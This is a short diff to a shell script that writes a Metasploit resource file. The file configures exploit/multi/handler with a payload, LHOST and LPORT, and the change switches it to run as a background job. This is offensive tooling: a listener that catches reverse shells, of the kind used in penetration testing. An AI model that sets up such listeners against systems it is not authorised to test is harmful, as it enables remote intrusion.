@@ -1812,8 +1812,7 @@ echo "use exploit/multi/handler" > $svf
 echo "set PAYLOAD $payload" >> $svf
 echo "set LHOST $yourip" >> $svf
 echo "set LPORT $yourport" >> $svf
-echo "exploit" >> $svf
-echo "exit -y" >> $svf
+echo "exploit -j" >> $svf
 echo -e $okegreen "Configuration file saved to $list/$save.rc"
 fi
 echo -e $okegreen ""
